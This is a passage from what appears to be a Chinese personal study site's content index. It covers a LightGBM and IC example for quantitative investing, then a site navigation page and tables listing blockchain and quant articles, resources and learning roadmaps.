目标变量\n \nX_val = np.random.randn(200, 50)\ny_val = np.random.randn(200)\n \n# 创建数据集\ntrain_data = lgb.Dataset(X_train, label=y_train)\nval_data = lgb.Dataset(X_val, label=y_val, reference=train_data)\n \n# 设置参数\nparams = {\n    &#039;objective&#039;: &#039;regression&#039;,\n    &#039;metric&#039;: &#039;rmse&#039;,\n    &#039;num_leaves&#039;: 31,\n    &#039;learning_rate&#039;: 0.05,\n}\n \n# 训练模型\nmodel = lgb.train(\n    params,\n    train_data,\n    num_boost_round=1000,\n    valid_sets=[train_data, val_data],\n    callbacks=[lgb.early_stopping(stopping_rounds=50)]\n)\n \n# 预测\ny_pred = model.predict(X_val)\n示例2：计算IC指标\nfrom scipy.stats import pearsonr\n \n# 计算IC\nic = pearsonr(y_pred, y_val)[0]\nprint(f&quot;IC = {ic:.4f}&quot;)\n\n❓ 常见问题\nQ1: 如何处理时序数据的划分？\n使用时间序列交叉验证，确保训练集严格在验证集之前。详细方法请参考 时序数据划分。\nQ2: IC值多少算是好？\n一般来说：\n\nIC &gt; 0.05：优秀\nIC ∈ [0.02, 0.05]：良好\nIC &lt; 0.02：较差\n\n但具体要看市场和数据特性。\nQ3: 如何避免未来信息泄露？\n严格遵守因果性原则，确保在时刻t的预测只能使用t时刻及之前的数据。详细内容请参考 时序数据划分。\nQ4: 如何选择LightGBM的参数？\n建议从简单参数开始，逐步调优：\n\n先设置 num_leaves 和 learning_rate\n调整 bagging_fraction 和 feature_fraction\n最后微调正则化参数\n\n详见 模型训练。\n\n📖 推荐阅读顺序\n理论学习\n\nQlib特征工程全景概览\nGradient Boosting原理\nRank IC评估指标\n\n实践应用\n\n时序数据划分\n模型训练\n特征重要性分析\n\n进阶提升\n\n相对强弱预测的量化思维\nQlib特征工程实践指南\n交易策略理论\n投资组合构建方法\n\n高级实战\n\n相对强弱预测的量化思维\nQlib特征工程实践指南\n交易策略理论\n投资组合构建方法\n\n\n🤝 获取帮助\n\n仔细阅读相关文档，大部分问题都有详细解答\n检查代码示例，确保理解每个步骤\n在实践中不断尝试和调整参数\n\n\n← 返回首页 | 特征工程 | LightGBM"},"站点导航":{"slug":"站点导航","filePath":"站点导航.md","title":"站点导航","links":["/","快速开始","关于","quant/qlib/","quant/qlib/week1/","quant/qlib/week2/","quant/qlib/week3/","quant/qlib/week5/","quant/qlib/week1/01-qlib特征工程全景概览","quant/qlib/week1/02-horizon对齐详解","quant/qlib/week1/03-横截面标准化与中性化","quant/qlib/week1/04-相对强弱预测的量化思维","quant/qlib/week1/05-qlib特征工程实践指南","quant/qlib/week2/01-Gradient-Boosting原理","quant/qlib/week2/02-时序数据划分","quant/qlib/week2/03-模型训练","quant/qlib/week2/04-IC-Rank-IC评估指标","quant/qlib/week2/05-特征重要性分析","quant/qlib/week2/06-学习检查清单","quant/qlib/week3/01-交易策略理论","quant/qlib/week3/02-投资组合构建方法","quant/qlib/week3/03-Executor与成本模型","quant/qlib/week3/04-绩效评估指标","quant/qlib/week3/05-实验分析方法","quant/qlib/week3/06-回测流程与实践","quant/qlib/week3/07-学习检查清单","quant/qlib/week5/01_基础理论系列/","quant/qlib/week5/02_PyTorch框架系列/","quant/qlib/week5/03_LSTM模型构建系列/","quant/qlib/week5/04_时序数据处理系列/","quant/qlib/week5/05_模型训练优化系列/","quant/qlib/week5/06_实战应用系列/","blockchainguide/Blockchain_Basics/","blockchainguide/Public_Chain_Development/","blockchainguide/Public_Chain_Development/Public_Chain_Research/Ethereum/","blockchainguide/Public_Chain_Development/Public_Chain_Research/cosmos/","blockchainguide/Public_Chain_Development/Public_Chain_Research/hyperleger_fabric/","blockchainguide/Public_Chain_Development/Public_Chain_Research/ton/","blockchainguide/Public_Chain_Development/Cryptography/","blockchainguide/Public_Chain_Development/P2P_Network/","blockchainguide/Public_Chain_Development/Consensus_Mechanisms/","blockchainguide/Public_Chain_Development/数据可用性DA探索/","blockchainguide/DApp_Development/","blockchainguide/DApp_Development/合约基础/","blockchainguide/DApp_Development/合约高级技巧/","blockchainguide/DApp_Development/安全审计/","blockchainguide/DApp_Development/EVM/账户抽象/","blockchainguide/DApp_Development/应用场景/","blockchainguide/DApp_Development/应用场景/defi/","blockchainguide/DApp_Development/应用场景/defi/uniswap/","blockchainguide/DApp_Development/应用场景/defi/pancake/","blockchainguide/DApp_Development/应用场景/defi/aave/","blockchainguide/DApp_Development/应用场景/nft/","blockchainguide/DApp_Development/应用场景/数字版权保护/","blockchainguide/DApp_Development/eip/","blockchainguide/Layer2_Solutions/","blockchainguide/Layer2_Solutions/layer2/","blockchainguide/Layer2_Solutions/layer2/optimism/","blockchainguide/Layer2_Solutions/layer2/arbitrum/","blockchainguide/Layer2_Solutions/layer2/zkroullup/","blockchainguide/Layer2_Solutions/layer2/celestia/","blockchainguide/Layer2_Solutions/layer2/rollkit/","blockchainguide/Layer2_Solutions/b2network/","blockchainguide/Layer2_Solutions/btclayer2/","blockchainguide/Cross_Chain_Technology/","blockchainguide/Cross_Chain_Technology/跨链方案/","blockchainguide/Cross_Chain_Technology/跨链方案/跨链桥/","blockchainguide/Decentralized_Storage/","blockchainguide/Decentralized_Storage/IPFS/","blockchainguide/Decentralized_Storage/FileCoin/","blockchainguide/Privacy_Computing/","blockchainguide/Privacy_Computing/ZK/","blockchainguide/Privacy_Computing/安全多方计算/","blockchainguide/Learning_Roadmaps_And_Resources/"],"tags":[],"content":"title: 站点导航\n站点导航\n\n快速找到你想要的内容\n\n\n👤 关于我\n我是一名热爱技术的开发者，专注于量化投资和区块链技术两个领域。\n🎯 技术方向\n量化投资\n\n特征工程：Qlib平台应用与实践\n机器学习：LightGBM、XGBoost\n深度学习：PyTorch、LSTM、Transformer\n回测系统：策略评估与绩效分析\n\n区块链技术\n\n智能合约：Solidity开发与安全\nDeFi应用：去中心化金融协议\nWeb3开发：DApp前端与区块链交互\nLayer2：扩容方案研究与实现\n\n🛠️ 技术栈\n\n  Python\n  JavaScript\n  TypeScript\n  Solidity\n  PyTorch\n  Qlib\n  Ethers.js\n  Next.js\n\n📞 联系方式\n\n📧 Email: [待添加]\n💬 微信: mindcarver\n💻 GitHub: [待添加]\n\n\n📋 主页和导航\n\n首页\n快速开始\n关于\n\n\n📊 量化投资\nQlib学习路径\n\nQlib学习总览\n\nWeek 1 - 特征工程\nWeek 2 - LightGBM\nWeek 3 - 回测系统\nWeek 5 - LSTM深度学习\n\n\n\nWeek 1 - 特征工程\n系统讲解Qlib特征工程的核心概念与实践方法。\n\n特征工程模块\n\n01-qlib特征工程全景概览\n02-horizon对齐详解\n03-横截面标准化与中性化\n04-相对强弱预测的量化思维\n05-qlib特征工程实践指南\n\n\n\nWeek 2 - LightGBM\n深入学习LightGBM在量化投资中的应用。\n\nLightGBM模块\n\n01-Gradient Boosting原理\n02-时序数据划分\n03-模型训练\n04-IC-Rank-IC评估指标\n05-特征重要性分析\n06-学习检查清单\n\n\n\nWeek 3 - 回测系统\n完整讲解策略回测、投资组合构建、绩效评估。\n\n回测引擎模块\n\n01-交易策略理论\n02-投资组合构建方法\n03-Executor与成本模型\n04-绩效评估指标\n05-实验分析方法\n06-回测流程与实践\n07-学习检查清单\n\n\n\nWeek 5 - LSTM深度学习\n深入学习LSTM神经网络，掌握时序数据的深度学习方法。\n\nLSTM模块\n\n基础理论系列 - 深度学习基础、RNN与LSTM原理\nPyTorch框架系列 - Tensor、Autograd、nn.Module\nLSTM模型构建系列 - 单层、多层、双向LSTM\n时序数据处理系列 - 滑动窗口、标准化、Dataset\n模型训练优化系列 - 损失函数、优化器、训练循环\n实战应用系列 - 完整流程、调优、评估\n\n\n\n\n🔗 区块链技术\n探索去中心化世界，从智能合约到DeFi应用。\n区块链基础\n\n区块链基础\n\n公链开发\n\n公链开发总览\n\n以太坊研究\nCosmos研究\nHyperledger Fabric\nTON开发\n密码学\nP2P网络\n共识机制\n数据可用性DA探索\n\n\n\nDApp开发\n\nDApp开发总览\n\n智能合约基础\n合约高级技巧\n安全审计\nEVM账户抽象\n应用场景\n\nDeFi\n\nUniswap\nPancakeSwap\nAave\n\n\nNFT\n数字版权保护\n\n\nEIP标准\n\n\n\nLayer2解决方案\n\nLayer2总览\n\nLayer2技术\nOptimism\nArbitrum\nzkRollup\n[Polygon zkEVM](blockchainguide/Layer2_Solutions/layer2/Polygon zkevm/)\nCelestia\nRollkit\nb2network\nBitcoin Layer2\n\n\n\n跨链技术\n\n跨链技术总览\n\n跨链方案\n\n跨链桥\n\n\n\n\n\n去中心化存储\n\n去中心化存储总览\n\nIPFS\nFileCoin\n\n\n\n隐私计算\n\n隐私计算总览\n\n零知识证明\n安全多方计算\n\n\n\n学习路线\n\n学习路线图\n\n\n📚 学习路径\n新手入门\n量化投资\n特征工程基础 → LightGBM原理 → 模型训练 → 投资组合构建 → 策略回测\n\n区块链开发\n区块链基础 → 智能合约入门 → Solidity基础 → 简单DApp开发\n\n适合初学者，从基础概念开始，逐步学习完整的开发流程。\n进阶提升\n量化投资\n时序数据划分 → IC优化训练 → 特征重要性分析 → 成本模型 → 绩效评估\n\n区块链开发\n公链架构研究 → 智能合约高级技巧 → DeFi协议开发 → Layer2技术\n\n适合有一定基础的学习者，深入理解和优化各个环节。\n实战应用\n从实际项目出发 → 遇到问题查文档 → 理论学习 → 实践应用\n\n适合有经验的开发者，通过解决实际问题提升技能。\n\n🏷️ 标签索引\n按主题分类\n特征工程\n\nQlib特征工程\nHorizon对齐\n横截面标准化\n\n机器学习\n\nLightGBM\nGradient Boosting\n模型训练\n\n深度学习\n\nLSTM\nPyTorch\n时序预测\n\n回测系统\n\n回测引擎\n交易策略\n绩效评估\n\n智能合约\n\nSolidity基础\n合约高级技巧\n安全审计\nEIP标准\n\nDeFi应用\n\nUniswap\nPancakeSwap\nAave\n\nLayer2技术\n\nOptimism\nArbitrum\nzkRollup\n\n公链研究\n\n以太坊\nCosmos\nHyperledger Fabric\nTON\n\n按难度分类\n入门级\n\nQlib特征工程全景概览\n快速开始\n\n进阶级\n\nLightGBM原理\nIC-Rank-IC评估指标\n\n高级\n\nLSTM深度学习\n投资组合构建方法\n公链开发\nLayer2技术\n隐私计算\n\n\n🔗 相关资源\n官方文档\n量化投资\n\nQlib官方文档\nLightGBM官方文档\nPyTorch官方文档\n\n区块链\n\nEthereum.org\nSolidity文档\nOpenZeppelin\n\n开源项目\n\nQlib GitHub\nLightGBM GitHub\nPyTorch GitHub\n\n学习资源\n\nQuantStart量化教程\nFast.ai深度学习\nEthereum开发者文档\n\n\n💡 使用技巧\n如何使用本站\n\n按学习路径学习：从Week 1开始，系统学习量化投资知识\n按主题查找：使用标签索引快速找到感兴趣的内容\n理论与实践结合：每个模块都包含代码示例，建议动手实践\n遇到问题查阅：将本站作为参考文档，随时查阅相关知识点\n\n浏览建议\n\n首次访问建议阅读快速开始\n按照推荐的学习路径逐步学习\n动手运行代码示例加深理解\n遇到问题使用搜索功能或查阅站点导航\n\n\n🔍 搜索建议\n如果你在寻找特定的内容，可以尝试以下关键词：\n\n特征工程: horizon、标准化、中性化\n机器学习: LightGBM、IC、特征重要性\n深度学习: LSTM、PyTorch、时序预测\n回测: 策略、绩效评估、投资组合\n智能合约: Solidity、合约安全、Gas优化、设计模式\nDeFi: Uniswap、PancakeSwap、Aave、DEX、借贷\nLayer2: Optimism、Arbitrum、zkRollup、zkEVM\n公链: 以太坊、Cosmos、Fabric、TON\n跨链: IBC、跨链桥、HTLC\n隐私计算: ZK、零知识证明、安全多方计算\n存储: IPFS、FileCoin\n\n\n📧 反馈与建议\n如果你发现文档中的错误或有改进建议，欢迎反馈：\n\n📝 提交Issue\n📧 Email: [待添加]\n💬 微信: [待添加]\n\n\n\n  💡 还在等什么？\n  开始你的学习之旅，探索量化投资的世界\n  \n    开始学习\n    快速开始\n  \n\n\n\n  如有疑问，欢迎查看 [关于](关于.md) 页面了解更多信息\n"},"📚_文章索引.base":{"slug":"📚_文章索引.base","filePath":"📚_文章索引.base.md","title":"📚_文章索引.base","links":[],"tags":[],"content":"区块链文章\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n标题分类子分类状态标签难度路径纠删码区块链Blockchain_Basics✅ 已完成入门,理论2blockchainguide/Blockchain_Basics/纠删码.md死磕共识算法_POW区块链Consensus_Mechanisms✅ 已完成进阶,理论4blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_pow算法-1.md死磕共识算法_POS区块链Consensus_Mechanisms✅ 已完成进阶,理论4blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_POS算法-2.md死磕共识算法_DPOS区块链Consensus_Mechanisms✅ 已完成进阶,理论3blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_DPOS算法-4.md死磕共识算法_Paxos区块链Consensus_Mechanisms✅ 已完成进阶,算法4blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Paxos算法-5.md死磕共识算法_Raft区块链Consensus_Mechanisms✅ 已完成进阶,算法4blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_Raft算法-6.md拜占庭将军问题区块链Consensus_Mechanisms✅ 已完成进阶,理论5blockchainguide/Public_Chain_Development/Consensus_Mechanisms/死磕共识算法_拜占庭将军问题-7.md死磕 uniswap v3区块链DApp✅ 已完成进阶,实战5blockchainguide/死磕 uniswap -v3.md\n量化学习文章\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n标题分类子分类状态标签难度路径qlib特征工程全景概览量化week1✅ 已完成入门,理论3quant/qlib/week1/01-qlib特征工程全景概览.mdhorizon对齐详解量化week1✅ 已完成进阶,理论3quant/qlib/week1/02-horizon对齐详解.md横截面标准化与中性化量化week1✅ 已完成进阶,理论4quant/qlib/week1/03-横截面标准化与中性化.md相对强弱预测的量化思维量化week1✅ 已完成进阶,理论3quant/qlib/week1/04-相对强弱预测的量化思维.mdqlib特征工程实践指南量化week1✅ 已完成实战,工具3quant/qlib/week1/05-qlib特征工程实践指南.mdGradient-Boosting原理量化week2✅ 已完成进阶,算法4quant/qlib/week2/01-Gradient-Boosting原理.md时序数据划分量化week2✅ 已完成进阶,理论3quant/qlib/week2/02-时序数据划分.md模型训练量化week2✅ 已完成实战,工具3quant/qlib/week2/03-模型训练.mdIC-Rank-IC评估指标量化week2✅ 已完成进阶,理论4quant/qlib/week2/04-IC-Rank-IC评估指标.md特征重要性分析量化week2✅ 已完成进阶,理论4quant/qlib/week2/05-特征重要性分析.md交易策略理论量化week3✅ 已完成进阶,理论3quant/qlib/week3/01-交易策略理论.md投资组合构建方法量化week3✅ 已完成进阶,理论4quant/qlib/week3/02-投资组合构建方法.mdExecutor与成本模型量化week3✅ 已完成进阶,理论4quant/qlib/week3/03-Executor与成本模型.md绩效评估指标量化week3✅ 已完成进阶,理论3quant/qlib/week3/04-绩效评估指标.md实验分析方法量化week3✅ 已完成实战,工具3quant/qlib/week3/05-实验分析方法.md回测流程与实践量化week3✅ 已完成实战,工具3quant/qlib/week3/06-回测流程与实践.md\nLSTM 系列\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n标题分类子分类状态标签难度路径基础理论系列LSTMweek5✅ 已完成入门,理论2quant/qlib/week5/01_基础理论系列/index.mdPyTorch框架系列LSTMweek5✅ 已完成实战,工具3quant/qlib/week5/02_PyTorch框架系列/index.mdLSTM模型构建系列LSTMweek5✅ 已完成进阶,实战4quant/qlib/week5/03_LSTM模型构建系列/index.md时序数据处理系列LSTMweek5✅ 已完成进阶,实战4quant/qlib/week5/04_时序数据处理系列/index.md模型训练优化系列LSTMweek5✅ 已完成进阶,实战4quant/qlib/week5/05_模型训练优化系列/index.md实战应用系列LSTMweek5✅ 已完成进阶,实战5quant/qlib/week5/06_实战应用系列/index.md\n通用页面\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n标题分类子分类状态标签难度路径首页通用-✅ 已完成入门1index.md站点导航通用-✅ 已完成入门1站点导航.md快速开始通用-✅ 已完成入门1快速开始.md关于通用-✅ 已完成入门1关于.md"},"🔗_资源链接库.base":{"slug":"🔗_资源链接库.base","filePath":"🔗_资源链接库.base.md","title":"🔗_资源链接库.base","links":[],"tags":[],"content":"区块链资源\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n资源名称类型领域分类URL描述难度推荐度状态标签Ethereum官方文档文档区块链以太坊ethereum.org/developers/docs以太坊开发者官方文档⭐⭐⭐⭐⭐⭐⭐⭐⏳ 待学习入门,免费,英文Solidity文档文档区块链智能合约docs.soliditylang.org/Solidity语言官方文档⭐⭐⭐⭐⭐⭐⭐⭐🔄 学习中入门,免费,英文Uniswap V3文档文档区块链DeFidocs.uniswap.org/Uniswap V3协议文档⭐⭐⭐⭐⭐⭐⭐⭐⭐🔄 学习中进阶,免费,英文Ethers.js工具区块链开发框架docs.ethers.org/以太坊JavaScript交互库⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏实战,免费,英文Hardhat工具区块链开发框架hardhat.org/以太坊开发环境⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏实战,免费,英文Remix IDE工具区块链在线IDEremix.ethereum.org/在线Solidity开发环境⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费,英文Mastering Ethereum书籍区块链以太坊github.com/ethereumbook/ethereumbook以太坊技术圣经⭐⭐⭐⭐⭐⭐⭐⭐⭐🔄 学习中进阶,免费,英文ConsenSys Academy课程区块链培训consensys.net/academy/ConsenSys官方培训课程⭐⭐⭐⭐⭐⭐⭐📌 收藏入门,免费,英文OpenZeppelin代码库区块链安全www.openzeppelin.com/智能合约安全标准库⭐⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏实战,免费,英文EIP标准文档区块链标准eips.ethereum.org/Ethereum改进提案⭐⭐⭐⭐⭐⭐⭐⭐⭐⏳ 待学习进阶,免费,英文Paradigm博客博客区块链研究www.paradigm.xyz/顶级加密基金研究博客⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏高级,免费,英文Vitalik博客博客区块链研究vitalik.ca/以太坊创始人个人博客⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏高级,免费,英文\n量化资源\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n资源名称类型领域分类URL描述难度推荐度状态标签qlib文档文档量化框架qlib.readthedocs.io/量化AI投资平台微软开源⭐⭐⭐⭐⭐⭐⭐⭐✅ 已学完进阶,免费,英文Zipline代码库量化回测github.com/quantopian/ziplineQuantopian开源回测引擎⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏实战,免费,英文Backtrader代码库量化回测www.backtrader.com/Python回测框架⭐⭐⭐⭐⭐⭐⭐📌 收藏实战,免费,英文jqData工具量化数据www.joinquant.com/data聚宽金融数据服务⭐⭐⭐⭐⭐⭐📌 收藏入门,付费,中文Tushare工具量化数据tushare.pro/免费财经数据接口⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费,中文Quantopian Lectures课程量化教学www.quantopian.com/lectures量化交易在线课程⭐⭐⭐⭐⭐⭐⭐⭐✅ 已学完进阶,免费,英文Advances in Financial ML书籍量化机器学习www.amazon.com/Advances-Financial-Machine-Learning-Marcos/dp/1119482089金融机器学习经典⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐🔄 学习中高级,付费,英文因子动物园论文量化因子faculty.fuqua.duke.edu/~charvey/Teaching/BA453_2006/Zoo.pdf数百个量化因子综述⭐⭐⭐⭐⭐⭐⭐⭐⭐⏳ 待学习高级,免费,英文World Quant博客博客量化实战blog.worldquant.com/World Quant研究博客⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏进阶,免费,英文arXiv量化论文量化研究arxiv.org/list/q-fin/recent量化金融最新论文⭐⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏高级,免费,英文\n深度学习资源\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n资源名称类型领域分类URL描述难度推荐度状态标签PyTorch官方教程文档深度学习框架pytorch.org/tutorials/PyTorch官方教程⭐⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费,英文CS231n课程深度学习视觉cs231n.github.io/斯坦福CNN课程⭐⭐⭐⭐⭐⭐⭐⭐✅ 已学完进阶,免费,英文fast.ai课程深度学习教学www.fast.ai/自顶向下深度学习⭐⭐⭐⭐⭐⭐⭐📌 收藏入门,免费,英文Andrej Karpathy视频深度学习教学www.youtube.com/@AndrejKarpathy前OpenAI AI总监教学⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏进阶,免费,英文Attention is All You Need论文深度学习Transformerarxiv.org/abs/1706.03762Transformer原始论文⭐⭐⭐⭐⭐⭐⭐⭐⭐✅ 已学完进阶,免费,英文Jay Alammar博客博客深度学习可视化jalammar.github.io/深度学习概念可视化⭐⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费,英文Hugging Face代码库深度学习NLPhuggingface.co/预训练模型社区⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏实战,免费,英文Colab工具深度学习环境colab.research.google.com/Google免费GPU环境⭐⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费,英文\n通用资源\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n资源名称类型领域分类URL描述难度推荐度状态标签GitHub工具通用代码托管github.com/全球最大代码托管平台⭐⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费,英文arXiv论文通用预印本arxiv.org/科研论文预印本库⭐⭐⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏高级,免费,英文Papers with Code代码库通用论文代码paperswithcode.com/论文与代码对应⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏进阶,免费,英文Notion工具通用笔记www.notion.so/现代笔记工具⭐⭐⭐⭐⭐✅ 已学完入门,免费/付费Obsidian工具通用笔记obsidian.md/本地知识库工具⭐⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费/付费Hacker News社区通用科技新闻news.ycombinator.com/科技新闻聚合⭐⭐⭐⭐⭐⭐⭐⭐📌 收藏进阶,免费,英文Stack Overflow社区通用问答stackoverflow.com/编程问答社区⭐⭐⭐⭐⭐⭐⭐✅ 已学完入门,免费,英文\n快速添加区\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n资源名称类型领域分类URL描述难度推荐度状态标签(新增资源)-------⏳ 待学习-"},"🗺️_学习路线图.base":{"slug":"🗺️_学习路线图.base","filePath":"🗺️_学习路线图.base.md","title":"🗺️_学习路线图.base","links":[],"tags":[],"content":"区块链学习路线\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n模块名称领域阶段顺序前置依赖状态预估时长实际时长包含内容输出产物优先级区块链基础认知区块链第一阶段：基础1-✅ 已完成1周1周- 分布式系统基础- 密码学基础- 哈希函数- 默克尔树- 基础概念理解⭐⭐⭐⭐⭐共识机制入门区块链第一阶段：基础2区块链基础认知✅ 已完成2周2周- POW原理- POS原理- DPOS原理- 拜占庭容错- 共识算法对比表- POW代码实现⭐⭐⭐⭐⭐分布式一致性算法区块链第二阶段：进阶3共识机制入门✅ 已完成2周2周- Paxos算法- Raft算法- CAP理论- 一致性模型- Raft实现Demo⭐⭐⭐⭐公链开发基础区块链第二阶段：进阶4分布式一致性算法⏳ 计划中3周-- P2P网络- 密码学原语- 交易结构- 区块结构- 简易区块链节点⭐⭐⭐⭐智能合约开发区块链第二阶段：进阶5公链开发基础⏳ 计划中3周-- Solidity语法- ERC标准- 安全最佳实践- 测试与部署- DApp合约代码⭐⭐⭐⭐⭐DApp开发实战区块链第三阶段：实战6智能合约开发⏳ 计划中4周-- Web3.js/Ethers.js- 前端集成- 钱包连接- 交互设计- 完整DApp项目- Uniswap V3深度解析⭐⭐⭐⭐⭐DeFi协议解析区块链第三阶段：实战7DApp开发实战🔄 进行中4周2周+- Uniswap V3- Aave/Compound- Curve- 衍生品协议- 协议源码分析笔记⭐⭐⭐⭐Layer2解决方案区块链第四阶段：高级8DeFi协议解析⏳ 计划中3周-- Optimistic Rollup- ZK Rollup- 状态通道- Plasma- Layer2对比分析⭐⭐⭐⭐跨链技术区块链第四阶段：高级9Layer2解决方案⏳ 计划中3周-- 哈希时间锁定- 中继链- 轻客户端- 跨链桥- 跨链方案设计⭐⭐⭐隐私计算区块链第四阶段：高级10跨链技术⏳ 计划中4周-- 零知识证明- 安全多方计算- 同态加密- 隐私币原理- ZK-SNARK实现⭐⭐⭐\n量化学习路线\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n模块名称领域阶段顺序前置依赖状态预估时长实际时长包含内容输出产物优先级Python基础量化第一阶段：基础1-✅ 已完成1周1周- NumPy/Pandas- 数据可视化- 时间序列处理- 数据处理代码库⭐⭐⭐⭐⭐金融基础量化第一阶段：基础2-✅ 已完成2周2周- 股票/期货基础- 订单簿- 交易机制- 金融指标- 交易认知框架⭐⭐⭐⭐⭐qlib框架入门量化第一阶段：基础3Python基础,金融基础✅ 已完成2周2周- qlib安装配置- 数据加载- 基础API- 特征工程基础- qlib环境搭建- 特征工程Demo⭐⭐⭐⭐⭐特征工程深入量化第二阶段：进阶4qlib框架入门✅ 已完成3周3周- Horizon对齐- 标准化中性化- 因子挖掘- 特征选择- 因子库- 特征工程SOP⭐⭐⭐⭐⭐机器学习模型量化第二阶段：进阶5特征工程深入✅ 已完成3周3周- Gradient Boosting- 时序数据划分- 模型训练- 超参优化- 模型训练框架⭐⭐⭐⭐⭐模型评估量化第二阶段：进阶6机器学习模型✅ 已完成2周2周- IC/RankIC- 特征重要性- 回测框架- 绩效指标- 评估报告模板⭐⭐⭐⭐⭐策略构建量化第三阶段：实战7模型评估✅ 已完成3周3周- 交易策略理论- 组合构建- 成本模型- 风险管理- 完整策略代码⭐⭐⭐⭐⭐回测与优化量化第三阶段：实战8策略构建✅ 已完成2周2周- 